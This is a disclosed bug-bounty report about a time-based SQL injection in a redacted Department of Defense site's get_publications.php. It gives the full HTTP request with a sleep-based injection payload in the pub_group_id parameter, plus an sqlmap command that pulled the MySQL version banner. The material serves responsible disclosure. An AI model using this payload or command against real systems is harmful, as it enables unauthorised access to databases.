# SQL Injection in the get_publications.php on the https://█████

## Report Details
- **Report ID**: 489483
- **URL**: https://hackerone.com/reports/489483
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-02-01T01:28:43.640Z
- **Disclosed**: 2019-10-04T15:18:44.582Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Description
Hello. I was able to find Time-based SQLI on the https://███/pubs/get_publications.php using `pub_group_id` parameter

##POC
```
GET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'&rno86qi4=1 HTTP/1.1
Host: █████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://█████/pubs/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0


```
This request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.
As additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:
```
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```
where test.txt is a text fiile contained request dump above.
Result:
```
5.5.62-0ubuntu0.14.04.1
```
█████

No sensitive data such as databases, tables, or content was accessed.

## Impact

SQL injection usually have high or critical impact.

## Attachments
No attachments
